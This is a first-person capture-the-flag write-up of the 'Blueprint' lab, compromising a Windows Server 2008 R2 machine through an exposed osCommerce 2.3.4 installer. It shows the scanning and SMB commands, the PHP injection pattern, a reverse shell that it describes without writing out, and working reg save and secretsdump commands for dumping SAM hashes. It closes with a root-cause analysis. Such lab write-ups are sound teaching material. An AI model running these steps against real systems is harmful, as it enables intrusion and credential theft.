# Blueprint — Technical Writeup

## Overview

**Target:** `10.49.169.81`  
**Platform:** Windows Server 2008 R2 SP1  
**Objective:** Obtain the `Lab` user's NTLM hash and demonstrate privilege escalation to `SYSTEM`.

### Attack Path

```text
Network Enumeration
        │
        ├── SMB Anonymous Access
        │
        └── Web Enumeration
                │
                └── osCommerce 2.3.4
                        │
                        └── Unauthenticated RCE
                                │
                                ▼
                         NT AUTHORITY\SYSTEM
                                │
                                ▼
                       SAM + SYSTEM Hives
                                │
                                ▼
                       Offline Hash Extraction
                                │
                                ▼
                         Lab NTLM Hash
```

---

## 1. Reconnaissance

I began with an Nmap scan to identify exposed services and establish the attack surface.

```bash
nmap -sS -sV -O 10.49.169.81
```

### Nmap Results

```text
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
3306/tcp  open  mysql        MariaDB
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
49176/tcp open  msrpc        Microsoft Windows RPC
```

OS detection identified the target as:

```text
Microsoft Server 2008 R2 SP1
```

Two areas immediately warranted further enumeration:

- SMB on TCP/445
- The Apache/PHP web application running on ports 443 and 8080

---

## 2. SMB Enumeration

I first checked whether the SMB service allowed unauthenticated enumeration.

```bash
smbclient -L //10.49.169.81 -U ""
```

The following shares were exposed:

```text
ADMIN$
C$
IPC$
Users
Windows
```

Anonymous access to the `Users` share was permitted:

```bash
smbclient //10.49.169.81/Users -N
```

I enumerated the available files and directories but did not find immediately useful credentials or other information.

The `Windows` share did not provide useful access without additional permissions, so I moved on to web application enumeration.

---

## 3. Web Enumeration

I used directory enumeration to identify interesting web functionality.

One of the notable discoveries was the `oscommerce-2.3.4` application. I also identified endpoints such as:

```text
/server-status
/phpmyadmin
```

The `server-status` endpoint was accessible, while `phpmyadmin` returned `403 Forbidden`.

Further enumeration of the osCommerce installation revealed directories including:

```text
/catalog
/docs
```

More importantly, the installation functionality was still exposed under:

```text
/catalog/install/
```

At this point, the application version became particularly interesting because known vulnerabilities exist in osCommerce 2.3.4.

---

## 4. Vulnerability Identification

I searched for version-specific vulnerabilities using SearchSploit:

```bash
searchsploit osCommerce 2.3.4
```

Relevant results included:

```text
osCommerce 2.3.4 - Multiple Vulnerabilities
osCommerce 2.3.4.1 - 'currency' SQL Injection
osCommerce 2.3.4.1 - 'products_id' SQL Injection
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting
osCommerce 2.3.4.1 - Arbitrary File Upload
osCommerce 2.3.4.1 - Remote Code Execution
osCommerce 2.3.4.1 - Remote Code Execution (2)
```

The relevant exploit was:

```text
php/webapps/44374.py
```

The exploit targeted the osCommerce installation functionality and provided remote code execution when the `/install/` directory remained accessible.

---

## 5. Understanding the RCE

Rather than treating the exploit as a black box, I examined how it achieved code execution.

The installer generates PHP configuration statements similar to:

```php
define('DB_DATABASE', '<input>');
```

The exploit supplies specially crafted input that terminates the existing PHP string and injects another PHP statement.

### Normal behavior

```php
define('DB_DATABASE', 'database');
```

### Conceptual malicious input

```text
'); <PHP code> /*
```

This causes the generated PHP to become conceptually similar to:

```php
define('DB_DATABASE', '');
<attacker-controlled PHP code>
/* ... */
```

The `/*` comments out the remainder of the generated statement, preventing the injected PHP from being invalidated by the original trailing syntax.

Therefore, an attacker-controlled configuration parameter is transformed into a PHP code-execution primitive.

The exploit reference was:

> Exploit-DB 44374 — osCommerce 2.3.4.1 Remote Code Execution

---

## 6. Triggering the RCE

The installer functionality was accessible on the target, and the vulnerable installation process could be reached directly at the relevant installation step.

The exploit generated:

```text
install/includes/configure.php
```

Accessing the generated configuration file caused the injected PHP code to execute.

### Initial Test

I initially tested command execution with:

```php
system("whoami")
```

However, the target returned an error because the `system` PHP function was disabled.

I then used `phpinfo()` to inspect the PHP configuration.

The relevant configuration was:

```text
disable_functions = system
```

This confirmed that the RCE itself was functional; only the particular execution primitive was disabled.

I therefore tested another available PHP command-execution function:

```php
echo shell_exec("whoami");
```

The response was:

```text
NT AUTHORITY\SYSTEM
```

This was significant because the web application was executing with `SYSTEM` privileges.

No separate local privilege-escalation step was therefore required.

---

## 7. Obtaining a SYSTEM Shell

After confirming command execution, I generated a Windows PowerShell reverse-shell payload and configured a listener on the attacking machine.

Once the generated configuration file was accessed, the reverse shell connected back to the attacker.

The shell was running as:

```text
NT AUTHORITY\SYSTEM
```

At this point I had full local SYSTEM-level access to the target.

I also located the lab's `root.txt` under:

```text
C:\Users\Administrator\Desktop
```

---

## 8. Credential Material Acquisition

Initially, I considered using Mimikatz to dump credentials.

However, because the shell was already running as `SYSTEM`, I could instead obtain the local credential database directly from the Windows registry hives and perform the extraction offline.

The relevant files were:

```text
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
```

### SAM

The **SAM (Security Account Manager)** hive contains credential information for local Windows accounts.

### SYSTEM

The **SYSTEM** hive contains system-specific boot-key material required to decrypt protected SAM data.

Therefore, obtaining only the SAM hive is insufficient for normal offline NTLM hash extraction.

---

## 9. Exporting the Registry Hives

Because the shell was running as `SYSTEM`, I exported the required registry hives:

```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM.hiv
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hiv
```

I verified that both files were successfully created.

The resulting files were approximately:

```text
SAM.hiv       ~24 KB
SYSTEM.hiv    ~12 MB
```

---

## 10. Transferring the Hives

The target already exposed the `Users` SMB share anonymously.

Rather than introducing another transfer mechanism, I reused the existing SMB exposure.

I created a temporary directory under the publicly accessible user profile area:

```powershell
New-Item -ItemType Directory -Path C:\Users\Public\Documents\thm-transfer -Force
```

I then copied the hive files into the directory:

```powershell
Copy-Item C:\Windows\Temp\SAM.hiv C:\Users\Public\Documents\thm-transfer\

Copy-Item C:\Windows\Temp\SYSTEM.hiv C:\Users\Public\Documents\thm-transfer\
```

From the AttackBox, I connected to the SMB share:

```bash
smbclient //10.49.169.81/Users -N
```

I navigated to:

```text
Public/Documents/thm-transfer
```

and downloaded the files:

```text
get SAM.hiv
get SYSTEM.hiv
```

### Why reuse SMB?

This demonstrated a useful post-exploitation principle:

> Existing access paths can often be reused for data transfer instead of unnecessarily introducing additional tooling or network services.

---

## 11. Offline NTLM Hash Extraction

With both registry hives available locally, I used Impacket's `secretsdump.py`:

```bash
secretsdump.py -sam SAM.hiv -system SYSTEM.hiv LOCAL
```

The tool used the SYSTEM hive's boot-key material to process the SAM database and recover the local account hashes.

The output contained an entry corresponding to:

```text
Lab
```

The resulting record followed the standard format:

```text
username:RID:LM_hash:NT_hash:::
```

The NT hash was therefore the fourth field in the record.

---

## 12. Password Recovery

The recovered NT hash was submitted to an external hash lookup service. 

The plaintext credential for the `Lab` account was recovered.

---

# 13. Root Cause Analysis

The compromise was not caused by a single isolated issue. The attack chain depended on several security weaknesses.

### 13.1 Outdated Software

The server was running:

```text
osCommerce 2.3.4
PHP 5.6.28
Apache 2.4.23
```

These components are obsolete and expose the environment to known vulnerabilities.

### 13.2 Installation Functionality Remained Exposed

The osCommerce installation directory remained accessible after deployment:

```text
/catalog/install/
```

Installation functionality should not remain publicly accessible after an application has been deployed.

### 13.3 Dangerous Web Application Execution Context

The vulnerable web application was executing with:

```text
NT AUTHORITY\SYSTEM
```

This dramatically increased the impact of the RCE.

If the application had been running under a restricted service account, the initial compromise would not necessarily have resulted in immediate SYSTEM-level access.

### 13.4 Anonymous SMB Access

The server permitted unauthenticated access to the `Users` share.

Although this was not the initial compromise vector, it provided a convenient post-exploitation data-transfer mechanism.

### 13.5 Local Credential Material Accessible to SYSTEM

Once SYSTEM access was obtained, the SAM and SYSTEM registry hives could be exported and processed offline.

This allowed local account NTLM hashes to be recovered without requiring LSASS memory access.

---

# 14. Key Lessons Learned

### Don't stop at version enumeration

Finding:

```text
osCommerce 2.3.4
```

was only the beginning.

The more important question was:

> What functionality is exposed, and does this specific version have a vulnerability that matches the exposed functionality?

The exposed `/install/` directory provided the condition required by the RCE.

### Always determine the execution context

After obtaining RCE, determining the execution context is critical:

```cmd
whoami
```

The difference between a restricted application account and:

```text
NT AUTHORITY\SYSTEM
```

can completely change the post-exploitation path.

### Offline credential extraction is useful

Once privileged access exists, obtaining the necessary registry hives and processing them offline can be a clean alternative to executing credential-dumping tools directly on the target.

---

# 15. Final Attack Chain

```text
10.49.169.81
      │
      ├── TCP/445
      │     └── Anonymous SMB
      │
      └── TCP/80/443/8080
            │
            └── osCommerce 2.3.4
                    │
                    └── Exposed installer
                            │
                            └── PHP code injection
                                    │
                                    ▼
                            Arbitrary PHP execution
                                    │
                                    ▼
                            NT AUTHORITY\SYSTEM
                                    │
                                    ▼
                              SAM + SYSTEM
                                    │
                                    ▼
                            secretsdump.py
                                    │
                                    ▼
                              Lab NTLM hash
                                    │
                                    ▼
                            Password recovery
```

---

## Conclusion

The machine demonstrated how multiple relatively simple weaknesses can be chained into a complete compromise.

The initial foothold came from an exposed and vulnerable osCommerce installation. Because the application was running with `SYSTEM` privileges, successful RCE immediately provided the highest local privilege level. From there, the Windows SAM and SYSTEM registry hives were exported, transferred using the already-accessible SMB share, and processed offline to recover the `Lab` account's NTLM hash.

Sorry for not including screenshots, will definitely put next time :)
Thanks for reading, hope it helped!